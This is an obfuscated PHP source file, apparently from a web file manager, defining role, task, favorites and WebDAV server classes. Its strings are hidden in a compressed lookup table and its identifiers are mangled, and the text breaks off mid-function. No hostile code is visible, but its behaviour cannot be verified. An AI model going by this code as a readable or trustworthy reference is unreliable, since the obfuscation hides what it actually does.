<?php
 goto fÏ¢‡É“ğÏ; dòÂË”Ô’: define($_SERVER[‡’¶øåüç˜][0], $_SERVER[‡’¶øåüç˜][1]); $_SERVER[úÎ] = explode($_SERVER[‡’¶øåüç˜][2], gzinflate(substr($_SERVER[‡’¶øåüç˜][3], 10, -8))); function Model($F–‘ùéÄØÚ = '', $BË‡¼âŠô = '', $AÍÚ±¡§”“ = '') { goto BƒµŒ§ôñã; a¿É…ˆ¯šŞ: if (isset($C¾ò›½ˆÂ®[$Eòœè‰¦‡¬])) { return $C¾ò›½ˆÂ®[$Eòœè‰¦‡¬]; } if ($F–‘ùéÄØÚ) { $F–‘ùéÄØÚ = strtoupper($F–‘ùéÄØÚ[0]) . substr($F–‘ùéÄØÚ, 1); $bÛ¿ éŞİ = $F–‘ùéÄØÚ . $DÛŠˆ‰Š[1]; if (class_exists($bÛ¿ éŞİ)) { $C¾ò›½ˆÂ®[$Eòœè‰¦‡¬] = new $bÛ¿ éŞİ(); return $C¾ò›½ˆÂ®[$Eòœè‰¦‡¬]; } } if (!$AÍÚ±¡§”“) { $AÍÚ±¡§”“ = $GLOBALS[$DÛŠˆ‰Š[2]][$DÛŠˆ‰Š[3]]; } goto aƒî°¾…š™; aƒî°¾…š™: $C¾ò›½ˆÂ®[$Eòœè‰¦‡¬] = new ModelBase($F–‘ùéÄØÚ, $BË‡¼âŠô, $AÍÚ±¡§”“); return $C¾ò›½ˆÂ®[$Eòœè‰¦‡¬]; goto Eôóß¢‰–; BƒµŒ§ôñã: $DÛŠˆ‰Š =& $_SERVER[úÎ]; static $C¾ò›½ˆÂ® = array(); $Eòœè‰¦‡¬ = strtolower($BË‡¼âŠô . $DÛŠˆ‰Š[0] . $F–‘ùéÄØÚ); goto a¿É…ˆ¯šŞ; Eôóß¢‰–: } goto F¯§çâĞ¦; a¾àµ“²õö: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\162\157\x6c\x65\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x61\x75\x74\150", "\x6c\x61\142\x65\x6c", "\x64\x69\x73\x70\154\x61\171", "\x73\171\x73\164\x65\155", "\x64\145\163\143", "\151\147\156\157\162\145\x45\x78\164", "\151\x67\156\157\x72\x65\106\151\x6c\145\x53\151\172\x65", "\141\144\155\151\156\x69\163\x74\162\141\164\x6f\162", "\x73\x6f\162\x74"); public function listData($fè°•ù¯º = false, $A˜ˆ‡„° = "\163\x6f\x72\x74", $E•¸¶ƒ©•» = false) { $FÇé‚‹¾—ˆ =& $_SERVER[‡’¶øåüç˜]; $A¦í°²Ìíå = parent::listData($fè°•ù¯º, $A˜ˆ‡„°, $E•¸¶ƒ©•»); if (!$fè°•ù¯º) { $cöõïË–¡Ç = $FÇé‚‹¾—ˆ[2516]; foreach ($A¦í°²Ìíå as $bœ¼ñÜâ => $AõƒÀÜ…œ) { if ($AõƒÀÜ…œ[$FÇé‚‹¾—ˆ[2298]] == 1) { $A¦í°²Ìíå[$bœ¼ñÜâ][$FÇé‚‹¾—ˆ[417]] = $cöõïË–¡Ç; } } } return $A¦í°²Ìíå; } public function update($aµéùøàäé, $c×¸­Œ¦¬) { goto eÁ—ª‹åÂš; fÉòğàš·ö: if (!$fìŒÏëªàÖ || $FŸ×Ÿê¬áÎ && $FŸ×Ÿê¬áÎ[$cù–ìÁìé[371]] != $fìŒÏëªàÖ[$cù–ìÁìé[371]]) { return !1; } if ($FŸ×Ÿê¬áÎ[$cù–ìÁìé[2298]] == 1) { $c×¸­Œ¦¬ = array($cù–ìÁìé[28] => $c×¸­Œ¦¬[$cù–ìÁìé[28]], $cù–ìÁìé[2132] => $c×¸­Œ¦¬[$cù–ìÁìé[2132]]); } $this->filterAuth($c×¸­Œ¦¬[$cù–ìÁìé[388]]); goto b×§Şšğœö; b×§Şšğœö: return parent::update($aµéùøàäé, $c×¸­Œ¦¬); goto B•ƒîÇ¿Ü‚; eÁ—ª‹åÂš: $cù–ìÁìé =& $_SERVER[‡’¶øåüç˜]; $fìŒÏëªàÖ = parent::listData($aµéùøàäé); $FŸ×Ÿê¬áÎ = $this->findByName($c×¸­Œ¦¬[$cù–ìÁìé[28]]); goto fÉòğàš·ö; B•ƒîÇ¿Ü‚: } public function remove($f‰°á½’àÌ) { $c…¥÷¥øË = parent::listData($f‰°á½’àÌ); if (!$c…¥÷¥øË || $c…¥÷¥øË[$_SERVER[‡’¶øåüç˜][1087]]) { return !1; } return parent::remove($f‰°á½’àÌ); } public function add($F¿öË²…±) { goto C †Øò©à¨; C †Øò©à¨: $c›ƒ¨äÇöÌ =& $_SERVER[‡’¶øåüç˜]; $dñˆ¿†¾İæ = $F¿öË²…±[$c›ƒ¨äÇöÌ[28]]; if ($this->findByName($dñˆ¿†¾İæ)) { return !1; } goto d§ğÜÜš‘‰; C ÑÇİŸŞ: return parent::insert($F¿öË²…±); goto b™“ÛÌí¿£; d§ğÜÜš‘‰: $bùìëÓˆ = array($c›ƒ¨äÇöÌ[398] => $dñˆ¿†¾İæ, $c›ƒ¨äÇöÌ[2118] => $c›ƒ¨äÇöÌ[33], $c›ƒ¨äÇöÌ[2114] => $c›ƒ¨äÇöÌ[2122], $c›ƒ¨äÇöÌ[2517] => 1, $c›ƒ¨äÇöÌ[2117] => 0, $c›ƒ¨äÇöÌ[2518] => 0, $c›ƒ¨äÇöÌ[2116] => $this->getSort()); $F¿öË²…± = array_merge($bùìëÓˆ, $F¿öË²…±); $this->filterAuth($F¿öË²…±[$c›ƒ¨äÇöÌ[388]]); goto C ÑÇİŸŞ; b™“ÛÌí¿£: } private function getSort() { $fŞÒ—Ô…ãº =& $_SERVER[‡’¶øåüç˜]; $fĞ¬îÂ³¸› = parent::listData(); $CåßÙ¸èÊ¤ = array_to_keyvalue($fĞ¬îÂ³¸›, $fŞÒ—Ô…ãº[33], $fŞÒ—Ô…ãº[2134]); return empty($CåßÙ¸èÊ¤) ? 0 : max($CåßÙ¸èÊ¤) + 1; } private function filterAuth(&$f»ò¦ºÌ¦) { $bÊïÆ©¹·Ê =& $_SERVER[‡’¶øåüç˜]; $a¿ƒÂŒÍ‹Ü = array(); $e±ƒ«Ä¦±˜ = array_filter(explode($bÊïÆ©¹·Ê[47], $f»ò¦ºÌ¦)); foreach ($e±ƒ«Ä¦±˜ as $f»ò¦ºÌ¦) { $AÁÒÙç¨š¦ = explode($bÊïÆ©¹·Ê[91], $f»ò¦ºÌ¦); if ($AÁÒÙç¨š¦[0] == $bÊïÆ©¹·Ê[1789] && $AÁÒÙç¨š¦[1] != $bÊïÆ©¹·Ê[1044]) { $CÔ—òª¼ÂÁ = $AÁÒÙç¨š¦[0] . $bÊïÆ©¹·Ê[91] . $AÁÒÙç¨š¦[1] . $bÊïÆ©¹·Ê[2519]; if (!in_array($CÔ—òª¼ÂÁ, $e±ƒ«Ä¦±˜)) { $a¿ƒÂŒÍ‹Ü[] = $CÔ—òª¼ÂÁ; } } $a¿ƒÂŒÍ‹Ü[] = $f»ò¦ºÌ¦; } $f»ò¦ºÌ¦ = implode($bÊïÆ©¹·Ê[47], $a¿ƒÂŒÍ‹Ü); } public function sort($b®¹íˆ˜’ó, $có¦éòåòâ) { return parent::update($b®¹íˆ˜’ó, $có¦éòåòâ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\164\x61\x73\153\114\x69\x73\164"; public $field = array("\x6e\141\155\145", "\164\x79\x70\145", "\x65\x76\x65\156\x74", "\164\x69\155\145", "\x64\x65\x73\x63", "\x73\x79\x73\164\x65\x6d", "\145\156\141\142\154\x65", "\x6c\x61\x73\164\122\x75\x6e", "\163\157\162\x74"); public function listData($eÓ˜ËÑ¥ÀÇ = false, $b¯À™•‡ ò = "\x73\x6f\162\164", $C‰¼¨ÈËÌº = false) { return parent::listData($eÓ˜ËÑ¥ÀÇ, $b¯À™•‡ ò, $C‰¼¨ÈËÌº); } public function add($d›‡™ËÕ„Ù) { $f¼øê‘¨º¿ =& $_SERVER[‡’¶øåüç˜]; $F×Òï‚‹ = $this->findByName($d›‡™ËÕ„Ù[$f¼øê‘¨º¿[28]]); if ($F×Òï‚‹) { return !1; } $d›‡™ËÕ„Ù[$f¼øê‘¨º¿[1408]] = 0; $d›‡™ËÕ„Ù[$f¼øê‘¨º¿[2134]] = $this->getSort(); return parent::insert($d›‡™ËÕ„Ù); } private function getSort() { $eÆİÊ„ä«Û =& $_SERVER[‡’¶øåüç˜]; $E‚äéÍàÑÙ = parent::listData(); $aøÅóÚÑà„ = array_to_keyvalue($E‚äéÍàÑÙ, $eÆİÊ„ä«Û[33], $eÆİÊ„ä«Û[2134]); return empty($aøÅóÚÑà„) ? 0 : max($aøÅóÚÑà„) + 1; } public function update($Cñ¦…œƒò†, $F‚’¡Ç•·) { $cÚÀĞ®ˆí’ =& $_SERVER[‡’¶øåüç˜]; $f†ƒõ¬·˜© = $this->listData($Cñ¦…œƒò†); $d¨§–‚¥ó = $this->findByName($F‚’¡Ç•·[$cÚÀĞ®ˆí’[28]]); if (!$f†ƒõ¬·˜© || $d¨§–‚¥ó && $d¨§–‚¥ó[$cÚÀĞ®ˆí’[371]] != $f†ƒõ¬·˜©[$cÚÀĞ®ˆí’[371]]) { return !1; } return parent::update($Cñ¦…œƒò†, $F‚’¡Ç•·); } public function remove($Bö¨šöÍÍİ, $b‰ÜÉÜŠœ„ = false) { $A‹È´‰–ˆ =& $_SERVER[‡’¶øåüç˜]; $eºÌ´Øí¶ = $this->listData($Bö¨šöÍÍİ); if (!$eºÌ´Øí¶) { return; } if (!$b‰ÜÉÜŠœ„ && $eºÌ´Øí¶[$A‹È´‰–ˆ[1087]] == $A‹È´‰–ˆ[83]) { return !1; } return parent::remove($Bö¨šöÍÍİ); } public function enable($FÄ»‚ßîğ, $d¦¢ˆ…àó) { return $this->update($FÄ»‚ßîğ, array($_SERVER[‡’¶øåüç˜][2510] => $d¦¢ˆ…àó)); } public function run($cç‰‘Ãë„) { return $this->update($cç‰‘Ãë„, array($_SERVER[‡’¶øåüç˜][2520] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($BŠĞµ¢¥‘ù) { $FêÑœÕ™Ú† =& $_SERVER[‡’¶øåüç˜]; return array($FêÑœÕ™Ú†[2208] => array(USER_ID, $FêÑœÕ™Ú†[2521])); } protected function listData() { $CìŠï“Š„ =& $_SERVER[‡’¶øåüç˜]; $cÚÓ†ƒÒ×ö = array($CìŠï“Š„[1434] => USER_ID, $CìŠï“Š„[447] => 0); $f•–‚Ú¥î“ = $CìŠï“Š„[2522]; $aÖ‘¡Ÿ¢ä† = $this->field($f•–‚Ú¥î“)->where($cÚÓ†ƒÒ×ö)->order($CìŠï“Š„[2523])->select(); return $aÖ‘¡Ÿ¢ä† ? $aÖ‘¡Ÿ¢ä† : array(); } protected function resetCache() { } protected function listView() { goto b½Í¿ŠÌ˜; A–»ì¬àÖ: $Dè¦‘ŒêÚÖ = array_to_keyvalue($A‘Ä¢ßÅÏ­, $c´ ‹£İÌ[33], $c´ ‹£İÌ[75]); if (!$Dè¦‘ŒêÚÖ) { return $eÛè¢“×ª±; } $aÄõº£‹›‰ = 2000; goto føŠßËø; føŠßËø: $bŒ¬‰—²¿è = array($c´ ‹£İÌ[395] => array($c´ ‹£İÌ[396], $Dè¦‘ŒêÚÖ)); $aÔí¾ÕŠÑ‘ = Model($c´ ‹£İÌ[758])->listSource($bŒ¬‰—²¿è, $aÄõº£‹›‰); $aÔí¾ÕŠÑ‘ = array_merge($aÔí¾ÕŠÑ‘[$c´ ‹£İÌ[73]], $aÔí¾ÕŠÑ‘[$c´ ‹£İÌ[74]]); goto AÆ‡ÖÄóìº; AÆ‡ÖÄóìº: $aÔí¾ÕŠÑ‘ = array_to_keyvalue($aÔí¾ÕŠÑ‘, $c´ ‹£İÌ[381]); foreach ($eÛè¢“×ª± as $DË¶¨Üïáã => $bõÁ‹¹”İÉ) { $Fõ³Á×Á‡ = $aÔí¾ÕŠÑ‘[$bõÁ‹¹”İÉ[$c´ ‹£İÌ[75]]]; $Fõ³Á×Á‡ = $Fõ³Á×Á‡ ? $Fõ³Á×Á‡ : array(); $eÛè¢“×ª±[$DË¶¨Üïáã] = array_merge($Fõ³Á×Á‡, $bõÁ‹¹”İÉ); } return $eÛè¢“×ª±; goto Cï”Œ¾†ÆŞ; b½Í¿ŠÌ˜: $c´ ‹£İÌ =& $_SERVER[‡’¶øåüç˜]; $eÛè¢“×ª± = $this->listData(); $A‘Ä¢ßÅÏ­ = array_filter_by_field($eÛè¢“×ª±, $c´ ‹£İÌ[29], $c´ ‹£İÌ[394]); goto A–»ì¬àÖ; Cï”Œ¾†ÆŞ: } protected function addFav($E’äõÏåùƒ, $a¼¹¦Œçà› = '', $EÜÏÆ‹‘¨ = "\163\157\x75\162\x63\145") { goto e†œ©Šëìç; fä–‰Ã©‡: return $this->add($e´ñç£Ô); goto Fæ”„Çƒ´¸; Bğáà…õªğ: if (!$a¼¹¦Œçà› && $EÜÏÆ‹‘¨ == $B¯³èåáÂÈ[394]) { $d®»ğ×™Ã¿ = Model($B¯³èåáÂÈ[1124])->where(array($B¯³èåáÂÈ[395] => $E’äõÏåùƒ))->find(); if (!$d®»ğ×™Ã¿) { return !1; } $a¼¹¦Œçà› = $d®»ğ×™Ã¿[$B¯³èåáÂÈ[28]]; } $a¼¹¦Œçà› = $this->getAutoName($a¼¹¦Œçà›); $e´ñç£Ô = array($B¯³èåáÂÈ[1434] => USER_ID, $B¯³èåáÂÈ[447] => 0, $B¯³èåáÂÈ[398] => $a¼¹¦Œçà›, $B¯³èåáÂÈ[399] => $E’äõÏåùƒ, $B¯³èåáÂÈ[400] => $EÜÏÆ‹‘¨, $B¯³èåáÂÈ[2116] => $bÆ“öô«¡¤ + 1); goto fä–‰Ã©‡; Cé“í“÷: $cÀÕƒ»³§² = array($B¯³èåáÂÈ[1434] => USER_ID, $B¯³èåáÂÈ[447] => 0); $bÆ“öô«¡¤ = $this->where($cÀÕƒ»³§²)->max($B¯³èåáÂÈ[2134]); if (!$bÆ“öô«¡¤) { $bÆ“öô«¡¤ = 0; } goto Bğáà…õªğ; e†œ©Šëìç: $B¯³èåáÂÈ =& $_SERVER[‡’¶øåüç˜]; $cÀÕƒ»³§² = array($B¯³èåáÂÈ[1434] => USER_ID, $B¯³èåáÂÈ[447] => 0, $B¯³èåáÂÈ[400] => $EÜÏÆ‹‘¨, $B¯³èåáÂÈ[399] => $E’äõÏåùƒ); if ($this->where($cÀÕƒ»³§²)->find()) { return !1; } goto Cé“í“÷; Fæ”„Çƒ´¸: } protected function remove($cÁ®­Á˜’) { $FÁíã‰Çæ =& $_SERVER[‡’¶øåüç˜]; $cÕåí¦Ã±Œ = array($FÁíã‰Çæ[1434] => USER_ID, $FÁíã‰Çæ[397] => $cÁ®­Á˜’); return $this->where($cÕåí¦Ã±Œ)->delete(); } protected function removeByName($a½ïÒ’ƒ­) { $C½Ãè§ÇØ =& $_SERVER[‡’¶øåüç˜]; $cÅ”²¬ö» = array($C½Ãè§ÇØ[1434] => USER_ID, $C½Ãè§ÇØ[398] => $a½ïÒ’ƒ­, $C½Ãè§ÇØ[447] => 0); return $this->where($cÅ”²¬ö»)->delete(); } protected function rename($f©’²‰ÙÔ«, $f×óË£Å³÷) { $E³Å¢«šó© =& $_SERVER[‡’¶øåüç˜]; if ($f©’²‰ÙÔ« == $f×óË£Å³÷) { return !1; } $CùÚˆ§£‡ = $this->getAutoName($f×óË£Å³÷); if ($f×óË£Å³÷ != $CùÚˆ§£‡) { return !1; } $AÁÀ‡¹¸å¯ = array($E³Å¢«šó©[1434] => USER_ID, $E³Å¢«šó©[447] => 0, $E³Å¢«šó©[28] => $f©’²‰ÙÔ«); return $this->where($AÁÀ‡¹¸å¯)->save(array($E³Å¢«šó©[28] => $f×óË£Å³÷)); } protected function resetSort($D»ÏÍ¼©‚„) { $e¦®ç‹Óà =& $_SERVER[‡’¶øåüç˜]; $D»ÏÍ¼©‚„ = is_array($D»ÏÍ¼©‚„) ? $D»ÏÍ¼©‚„ : array(); $e‚ÃÖ¡¡À = array($e¦®ç‹Óà[1434] => USER_ID); for ($eÁ´ºÁ¡²„ = 0; $eÁ´ºÁ¡²„ < count($D»ÏÍ¼©‚„); $eÁ´ºÁ¡²„++) { $e‚ÃÖ¡¡À[$e¦®ç‹Óà[397]] = $D»ÏÍ¼©‚„[$eÁ´ºÁ¡²„]; $this->where($e‚ÃÖ¡¡À)->save(array($e¦®ç‹Óà[2116] => $eÁ´ºÁ¡²„ + 1)); } return !0; } protected function moveTop($C•¯ã«ë“×) { goto eÌòèÆÔÊ; fò‹‹Šà: $FªŒ×´³†ê = $b®„ÀÄµÉÍ; $b®„ÀÄµÉÍ = array_remove_value($b®„ÀÄµÉÍ, $C˜ãÅ»¹í­[$AÚÂ†Â«èã[371]]); array_unshift($b®„ÀÄµÉÍ, $C˜ãÅ»¹í­[$AÚÂ†Â«èã[371]]); goto eÙïî–ìÉÔ; e¬ğ°ÈÅ¹“: if (!$C˜ãÅ»¹í­) { return; } $b®„ÀÄµÉÍ = $this->field($AÚÂ†Â«èã[371])->where($f‚¨ö¦µ‰Ÿ)->order($AÚÂ†Â«èã[2523])->select(); $b®„ÀÄµÉÍ = array_to_keyvalue($b®„ÀÄµÉÍ, $AÚÂ†Â«èã[33], $AÚÂ†Â«èã[371]); goto fò‹‹Šà; eÌòèÆÔÊ: $AÚÂ†Â«èã =& $_SERVER[‡’¶øåüç˜]; $f‚¨ö¦µ‰Ÿ = array($AÚÂ†Â«èã[1434] => USER_ID, $AÚÂ†Â«èã[447] => 0); $C˜ãÅ»¹í­ = $this->where($f‚¨ö¦µ‰Ÿ)->where(array($AÚÂ†Â«èã[28] => $C•¯ã«ë“×))->find(); goto e¬ğ°ÈÅ¹“; eÙïî–ìÉÔ: return $this->resetSort($b®„ÀÄµÉÍ); goto eÏã‰ìİ°ƒ; eÏã‰ìİ°ƒ: } protected function moveBottom($EÅ‰ƒ»„è) { $f»Şõ”¹ÓŸ =& $_SERVER[‡’¶øåüç˜]; $fó‡°›¢†† = array($f»Şõ”¹ÓŸ[1434] => USER_ID, $f»Şõ”¹ÓŸ[447] => 0); $e¯™»ÖÕÙ¹ = $this->where($fó‡°›¢††)->max($f»Şõ”¹ÓŸ[2134]); $eŞÅ¢‚ªÆÔ = array($f»Şõ”¹ÓŸ[2134] => $e¯™»ÖÕÙ¹ + 1); return $this->where($fó‡°›¢††)->where(array($f»Şõ”¹ÓŸ[28] => $EÅ‰ƒ»„è))->save($eŞÅ¢‚ªÆÔ); } private function getAutoName($CÏÕ†ÜÍ†¸) { goto eùù¢²çÕ; e¨·÷ê¤: $E¶º‰‘°À = array_to_keyvalue($E¶º‰‘°À, $cÃº¼‡‹‘[33], $cÃº¼‡‹‘[28]); if (!$E¶º‰‘°À || !in_array($CÏÕ†ÜÍ†¸, $E¶º‰‘°À)) { return $CÏÕ†ÜÍ†¸; } for ($eà„Ä‰»ë£ = 0; $eà„Ä‰»ë£ < count($E¶º‰‘°À); $eà„Ä‰»ë£++) { if (!in_array($CÏÕ†ÜÍ†¸ . "\x28{$eà„Ä‰»ë£}\51", $E¶º‰‘°À)) { return $CÏÕ†ÜÍ†¸ . "\50{$eà„Ä‰»ë£}\x29"; } } goto CÍ¬‡Ï¨ò; eùù¢²çÕ: $cÃº¼‡‹‘ =& $_SERVER[‡’¶øåüç˜]; $f¼À‰†ó‰° = array($cÃº¼‡‹‘[1434] => USER_ID, $cÃº¼‡‹‘[447] => 0); $E¶º‰‘°À = $this->field($cÃº¼‡‹‘[28])->where($f¼À‰†ó‰°)->select(); goto e¨·÷ê¤; CÍ¬‡Ï¨ò: return $CÏÕ†ÜÍ†¸ . "\x28{$eà„Ä‰»ë£}\51"; goto fÖ‚äÒÑƒ³; fÖ‚äÒÑƒ³: } } goto fœÎÕÆµ¿‘; b³ëÛãé²Ş: class HttpDavServer { public function __construct($EÏ¹Êá™æ¼, $A©¹…‚°å) { $this->root = $EÏ¹Êá™æ¼; $this->initPath($A©¹…‚°å); $this->start(); } public function initPath($B’ó†õÚ° ) { $DùŒ•åª =& $_SERVER[‡’¶øåüç˜]; $aøğôù­õì = rtrim($_SERVER[$DùŒ•åª[1394]], $DùŒ•åª[8]) . $DùŒ•åª[8]; $this->urlBase = substr($aøğôù­õì, 0, strpos($aøğôù­õì, $B’ó†õÚ° ) + 1); $this->urlBase = rtrim($this->urlBase, $DùŒ•åª[8]) . $B’ó†õÚ° ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $cÒí¢‚áÎ¡ =& $_SERVER[‡’¶øåüç˜]; $FçÓõÇø†à = HttpAuth::get(); if ($FçÓõÇø†à[$cÒí¢‚áÎ¡[547]] == $cÒí¢‚áÎ¡[1789] && $FçÓõÇø†à[$cÒí¢‚áÎ¡[900]] == $cÒí¢‚áÎ¡[1790]) { return !0; } HttpAuth::error(); } public function start() { goto f‰³Ï©¬òõ; BÙë§ñ™ĞÎ: if (!$f¯Æ…ÃİŞ„) { return; } self::response($f¯Æ…ÃİŞ„); goto C‹Ñæõ½š‹; f‰³Ï©¬òõ: $eåğ ©ÅÓ¦ =& $_SERVER[‡’¶øåüç˜]; $this->checkUser(); $cÏ³ß‡ï§Û = $eåğ ©ÅÓ¦[144] . HttpHeader::method(); goto d­ë¿„òÄº; d­ë¿„òÄº: if (!method_exists($this, $cÏ³ß‡ï§Û)) { pr($cÏ³ß‡ï§Û . $eåğ ©ÅÓ¦[1791]); die; } $d¿Şº†š¢ = array($eåğ ©ÅÓ¦[1792], $eåğ ©ÅÓ¦[1793]); if (!in_array($cÏ³ß‡ï§Û, $d¿Şº†š¢) && !$this->pathExists($this->path)) { $f¯Æ…ÃİŞ„ = array($eåğ ©ÅÓ¦[1040] => 404); } else { $f¯Æ…ÃİŞ„ = $this->{$cÏ³ß‡ï§Û}(); } goto BÙë§ñ™ĞÎ; C‹Ñæõ½š‹: } public function pathGet($fñ”íå‡‘ = false) { $C¾´˜ŠŞ =& $_SERVER[‡’¶øåüç˜]; $eÙáå°“® = $fñ”íå‡‘ ? $_SERVER[$C¾´˜ŠŞ[1794]] : $_SERVER[$C¾´˜ŠŞ[1394]]; $eÙáå°“® = KodIO::clear(rawurldecode($eÙáå°“®)); if (!strstr($eÙáå°“®, KodIO::clear($this->urlBase))) { return !1; } return substr($eÙáå°“®, strpos($eÙáå°“®, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($CÉ¨¶ÈØ”) { return file_exists($CÉ¨¶ÈØ”); } public function pathMkdir($FÚµ™ÉõÉË) { return mkdir($FÚµ™ÉõÉË, 511, !0); } public function pathInfo($eªô–¢Ëé) { return path_info($eªô–¢Ëé); } public function pathList($BÜŠ‹–³øå) { return path_list($BÜŠ‹–³øå); } public function pathOut($d¨Ş¥®²») { echo file_get_contents($d¨Ş¥®²»); } public function pathPut($bİ§÷¨óº„, $BíÊĞğÛ = '') { if (!$BíÊĞğÛ) { return file_put_contents($bİ§÷¨óº„, $_SERVER[‡’¶øåüç˜][33]); } return move_path($BíÊĞğÛ, $bİ§÷¨óº„); } public function pathRemove($FÉ™ÛÓ—Áù) { if (is_file($FÉ™ÛÓ—Áù)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($EÍ˜£ÎªåŒ, $E¤¯£¢…¼Ò) { return move_path($EÍ˜£ÎªåŒ, $E¤¯£¢…¼Ò); } public function pathCopy($e¼õéŸ×Ù÷, $fŒ¾Šˆ¹) { return copy_dir($e¼õéŸ×Ù÷, $fŒ¾Šˆ¹); } public function parsePath($DùÃ±ˆšĞù) { return $DùÃ±ˆšĞù; } public function parseItem($Aê´¯éÃô, $b†®³ÂØÑ©) { goto dˆ˜ÑİŒ³Ú; EÜÄ‹¨òÁÙ: $dõ¶á´¾Ë = array($bÍ»›ŒŸÕÊ[1795] => KodIO::clear($this->urlBase . $Dœá…ƒ‰Ì…), $bÍ»›ŒŸÕÊ[107] => @gmdate($bÍ»›ŒŸÕÊ[1796], $Aê´¯éÃô[$bÍ»›ŒŸÕÊ[107]]), $bÍ»›ŒŸÕÊ[191] => @gmdate($bÍ»›ŒŸÕÊ[1797], $Aê´¯éÃô[$bÍ»›ŒŸÕÊ[191]]), $bÍ»›ŒŸÕÊ[77] => $Aê´¯éÃô[$bÍ»›ŒŸÕÊ[77]] ? $Aê´¯éÃô[$bÍ»›ŒŸÕÊ[77]] : 0); return $dõ¶á´¾Ë; goto cæŸ¨³¥‡Ê; döÔ–ŸéÄ: if ($b†®³ÂØÑ©) { $Dœá…ƒ‰Ì… = $bÍ»›ŒŸÕÊ[8] . str_replace($bÍ»›ŒŸÕÊ[176], $bÍ»›ŒŸÕÊ[8], rawurlencode($this->pathGet())); } if (!trim($Aê´¯éÃô[$bÍ»›ŒŸÕÊ[107]])) { $Aê´¯éÃô[$bÍ»›ŒŸÕÊ[107]] = time(); } if (!trim($Aê´¯éÃô[$bÍ»›ŒŸÕÊ[191]])) { $Aê´¯éÃô[$bÍ»›ŒŸÕÊ[191]] = time(); } goto EÜÄ‹¨òÁÙ; dˆ˜ÑİŒ³Ú: $bÍ»›ŒŸÕÊ =& $_SERVER[‡’¶øåüç˜]; $Dœá…ƒ‰Ì… = $this->pathGet() . $bÍ»›ŒŸÕÊ[8] . $Aê´¯éÃô[$bÍ»›ŒŸÕÊ[28]]; $Dœá…ƒ‰Ì… = $bÍ»›ŒŸÕÊ[8] . str_replace($bÍ»›ŒŸÕÊ[176], $bÍ»›ŒŸÕÊ[8], rawurlencode($Dœá…ƒ‰Ì…)); goto döÔ–ŸéÄ; cæŸ¨³¥‡Ê: } public function parseItemXml($E¡İá¦Â¶, $CàÖ¢òÉ”˜) { $A‰‡İãëó¶ =& $_SERVER[‡’¶øåüç˜]; $a‚ëĞ¸Ñ‰ = $this->parseItem($E¡İá¦Â¶, $CàÖ¢òÉ”˜); if ($E¡İá¦Â¶[$A‰‡İãëó¶[29]] == $A‰‡İãëó¶[76]) { $cƒÕÊ­Û„‡ = $A‰‡İãëó¶[1798]; $cƒÕÊ­Û„‡ .= $A‰‡İãëó¶[1799]; } else { $D«Ì èÃÎ¿ = $E¡İá¦Â¶[$A‰‡İãëó¶[165]] ? $E¡İá¦Â¶[$A‰‡İãëó¶[165]] : get_path_ext($E¡İá¦Â¶[$A‰‡İãëó¶[28]]); $d–ÙÚ¾ŞÃ† = get_file_mime($D«Ì èÃÎ¿); $cƒÕÊ­Û„‡ = $A‰‡İãëó¶[1800]; $cƒÕÊ­Û„‡ .= "\74\104\72\147\145\x74\x63\157\156\x74\x65\156\164\x74\x79\x70\145\76{$d–ÙÚ¾ŞÃ†}\x3c\x2f\104\72\x67\145\164\143\157\x6e\x74\x65\156\x74\164\171\160\145\x3e"; } return "\12\11\x9\74\104\72\x72\x65\x73\x70\x6f\x6e\x73\x65\x3e\xa\x9\x9\x9\x3c\x44\x3a\150\162\x65\146\x3e{$a‚ëĞ¸Ñ‰[$A‰‡İãëó¶[1795]]}\74\x2f\104\x3a\150\x72\145\x66\76\12\x9\x9\11\x3c\x44\x3a\160\x72\x6f\x70\x73\164\141\x74\x3e\12\11\x9\x9\x9\74\104\x3a\160\162\x6f\x70\x3e\xa\x9\11\11\x9\11\x3c\104\x3a\x67\145\164\x6c\x61\x73\164\155\157\144\151\146\151\145\144\76{$a‚ëĞ¸Ñ‰[$A‰‡İãëó¶[107]]}\74\57\104\x3a\x67\145\x74\154\141\x73\x74\x6d\x6f\144\151\x66\151\145\144\x3e\xa\x9\x9\11\x9\11\74\104\72\x63\x72\x65\141\164\x69\157\156\144\x61\x74\x65\76{$a‚ëĞ¸Ñ‰[$A‰‡İãëó¶[191]]}\74\x2f\x44\x3a\x63\162\145\x61\164\x69\x6f\x6e\144\x61\164\145\76\xa\11\11\11\x9\x9\x3c\x44\x3a\x67\x65\x74\143\157\156\164\x65\156\x74\x6c\145\156\x67\164\x68\x3e{$a‚ëĞ¸Ñ‰[$A‰‡İãëó¶[77]]}\x3c\57\104\72\147\145\x74\x63\x6f\156\x74\x65\x6e\164\154\x65\156\x67\164\150\76\xa\11\11\x9\11\x9{$cƒÕÊ­Û„‡}\xa\x9\x9\11\x9\x3c\57\104\x3a\160\x72\x6f\x70\x3e\xa\x9\x9\11\x9\74\104\72\x73\x74\x61\164\x75\163\x3e\x48\124\124\120\x2f\x31\x2e\61\x20\x32\60\60\x20\x4f\113\x3c\57\x44\x3a\x73\x74\x61\164\x75\x73\76\xa\x9\x9\11\x3c\x2f\104\72\160\x72\x6f\160\163\x74\141\164\76\xa\11\11\74\57\x44\x3a\162\145\x73\160\x6f\x6e\163\x65\x3e"; } public function pathListMerge($CĞÜ×ƒÖç£) { goto e«İ£’åĞ÷; EªãŒˆÖ¤: $F³âĞ‡·Ø = array(); foreach ($CĞÜ×ƒÖç£ as $dŠ«ŒøóÜ => $dçõ‡Õ‚ò) { if (!in_array($dŠ«ŒøóÜ, $EÑ ƒŞ˜Ç) || !is_array($dçõ‡Õ‚ò)) { continue; } $F³âĞ‡·Ø = array_merge($F³âĞ‡·Ø, $dçõ‡Õ‚ò); } foreach ($F³âĞ‡·Ø as &$a¹· ¸èİƒ) { $a¹· ¸èİƒ[$e‘Ö¯‹ßˆà[28]] = str_replace($e‘Ö¯‹ßˆà[8], $e‘Ö¯‹ßˆà[1396], $a¹· ¸èİƒ[$e‘Ö¯‹ßˆà[28]]); } goto B©¶¨„¹×Ï; e«İ£’åĞ÷: $e‘Ö¯‹ßˆà =& $_SERVER[‡’¶øåüç˜]; if (!$CĞÜ×ƒÖç£) { return 